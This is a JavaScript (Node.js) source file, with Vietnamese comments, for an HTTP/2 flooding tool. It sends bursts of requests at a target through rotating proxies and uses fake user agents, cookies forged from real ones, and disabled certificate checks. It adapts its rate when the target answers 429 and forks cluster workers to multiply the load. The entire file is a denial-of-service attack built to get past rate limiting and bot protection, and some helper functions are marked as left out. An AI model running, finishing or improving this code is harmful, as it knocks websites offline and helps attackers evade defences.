const fakeUa = require("fake-useragent");
const puppeteer = require("puppeteer");
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const retry = require("async-retry"); // Thêm async-retry

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Các hàm khác (readLines, rand, randIP, fakeCookieFromReal, detectProtection, decideMode, generateHeaders, testProxy, filterProxies) giữ nguyên

function runFlooder(args, mode, proxies, baseCookies) {
  const parsedTarget = url.parse(args.target);
  let tps = 0, err429 = 0, err403 = 0, timeoutErr = 0, rate = args.rate, cooldown = 0, proxyIndex = 0;

  // Pool lưu trữ các session HTTP/2
  const sessionPool = new Map(); // Key: proxy, Value: { client, tlsConn, lastUsed }
  const MAX_SESSIONS = 50; // Giới hạn số session đồng thời
  const SESSION_TIMEOUT = 60000; // Timeout session sau 60s không sử dụng
  const REQUESTS_PER_SESSION = 100; // Số yêu cầu tối đa trên mỗi session trước khi làm mới

  setInterval(() => {
    console.clear();
    console.log(`🌐 Target: ${args.target}`);
    console.log(`🚀 TPS: ${tps} | ❌ 429: ${err429} | 403: ${err403} | Timeout: ${timeoutErr} | 🔁 Rate: ${rate}`);
    console.log(`🔗 Active Sessions: ${sessionPool.size}/${MAX_SESSIONS}`);
    if (err429 > tps * 0.4 && rate > 5) { rate = Math.floor(rate * 0.8); cooldown = 5; }
    else if (err429 < tps * 0.05 && cooldown === 0 && rate < args.rate * 2) { rate += 5; }
    if (cooldown > 0) cooldown--;
    tps = 0; err429 = 0; err403 = 0; timeoutErr = 0;

    // Dọn dẹp session hết hạn
    for (const [proxy, { client, lastUsed }] of sessionPool) {
      if (Date.now() - lastUsed > SESSION_TIMEOUT) {
        client.close();
        sessionPool.delete(proxy);
      }
    }
  }, 1000);

  function getNextIdentity() {
    const proxy = proxies[proxyIndex % proxies.length];
    const ua = fakeUa();
    const realCookie = baseCookies.map(c => `${c.name}=${c.value}`).join("; ");
    const fakeFromReal = fakeCookieFromReal(baseCookies);
    const combinedCookie = `${realCookie}; ${fakeFromReal}`;
    const path = `/auto-${crypto.createHash("md5").update(ua + combinedCookie).digest("hex").slice(0,6)}`;
    proxyIndex++;
    return { proxy, ua, cookie: combinedCookie, path };
  }

  async function createSession(proxy, tlsConn) {
    return new Promise((resolve, reject) => {
      const client = http2.connect(parsedTarget.href, { createConnection: () => tlsConn });
      client.on("connect", () => resolve(client));
      client.on("error", err => reject(err));
    });
  }

  async function startFlood() {
    const { proxy, ua, cookie, path } = getNextIdentity();
    const [host, port] = proxy.split(":");

    // Kiểm tra session hiện có
    let sessionData = sessionPool.get(proxy);
    if (sessionData && sessionData.requestCount >= REQUESTS_PER_SESSION) {
      sessionData.client.close();
      sessionPool.delete(proxy);
      sessionData = null;
    }

    try {
      if (!sessionData) {
        // Retry cho việc tạo kết nối
        await retry(
          async () => {
            const socket = net.connect({ host, port: ~~port });
            const payload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nConnection: Keep-Alive\r\n\r\n`;
            socket.setTimeout(10000);

            await new Promise((resolve, reject) => {
              socket.on("connect", () => socket.write(payload));
              socket.on("data", chunk => {
                if (!chunk.toString().includes("200")) {
                  socket.destroy();
                  return reject(new Error("Proxy CONNECT failed"));
                }
                resolve();
              });
              socket.on("error", err => reject(err));
              socket.on("timeout", () => {
                socket.destroy();
                reject(new Error("Proxy timeout"));
              });
            });

            const tlsConn = tls.connect({
              socket,
              servername: parsedTarget.host,
              rejectUnauthorized: false,
              ALPNProtocols: ["h2"],
            });

            const client = await createSession(proxy, tlsConn);
            sessionData = { client, tlsConn, lastUsed: Date.now(), requestCount: 0 };
            if (sessionPool.size < MAX_SESSIONS) {
              sessionPool.set(proxy, sessionData);
            } else {
              // Thay thế session cũ nhất nếu vượt giới hạn
              const oldestProxy = [...sessionPool.entries()].reduce((a, b) => (a[1].lastUsed < b[1].lastUsed ? a : b))[0];
              sessionPool.get(oldestProxy).client.close();
              sessionPool.delete(oldestProxy);
              sessionPool.set(proxy, sessionData);
            }
          },
          {
            retries: 3, // Thử lại 3 lần
            factor: 2, // Tăng thời gian chờ theo cấp số nhân
            minTimeout: 1000, // Chờ tối thiểu 1s
            maxTimeout: 5000, // Chờ tối đa 5s
            onRetry: (err, attempt) => console.log(`Retry ${attempt} for proxy ${proxy}: ${err.message}`),
          }
        );
      }

      // Gửi yêu cầu trên session hiện có
      const { client } = sessionData;
      sessionData.lastUsed = Date.now();
      sessionData.requestCount = (sessionData.requestCount || 0) + rate;

      // Retry cho mỗi batch yêu cầu
      await retry(
        async () => {
          for (let i = 0; i < rate; i++) {
            const headers = generateHeaders(parsedTarget, ua, cookie, path, mode);
            const req = client.request(headers);
            req.on("response", headers => {
              const status = headers[":status"];
              if (status === 429) err429++;
              else if (status === 403) err403++;
              else if (status < 400) tps++;
              req.close();
            });
            req.on("error", () => timeoutErr++);
            req.end();
          }
        },
        {
          retries: 2, // Thử lại 2 lần cho batch yêu cầu
          minTimeout: 500,
          maxTimeout: 2000,
          onRetry: (err, attempt) => console.log(`Retry ${attempt} for requests on ${proxy}: ${err.message}`),
        }
      );
    } catch (err) {
      timeoutErr++;
      if (sessionData) {
        sessionData.client.close();
        sessionPool.delete(proxy);
      }
    }
  }

  setInterval(startFlood, 100); // Tăng tần suất gọi startFlood
  setTimeout(() => {
    for (const [, { client }] of sessionPool) client.close();
    process.exit(0);
  }, args.time * 1000);
}

// Phần còn lại của mã (async IIFE) giữ nguyên
(async () => {
  const [target, time, rateArg, threads, proxyFile] = process.argv.slice(2);
  if (!target || !time || !rateArg || !threads || !proxyFile) {
    console.log("Usage: node h3_ultimate_autoadapt.js <target> <time> <rate> <threads> <proxyFile>");
    return;
  }
  const args = { target, time: ~~time, rate: ~~rateArg, threads: ~~threads, proxyFile };
  console.log("🔍 Phát hiện bảo mật...");
  const { protection, cookies } = await detectProtection(target);
  const mode = decideMode(protection);
  console.log(`🛡️ Bảo vệ: ${protection} → Chế độ: ${mode}`);

  const allProxies = readLines(proxyFile);
  const goodProxies = await filterProxies(allProxies);
  if (!goodProxies.length) return console.error("❌ Không có proxy hợp lệ!");

  if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) cluster.fork();
  } else {
    runFlooder(args, mode, goodProxies, cookies);
  }
})();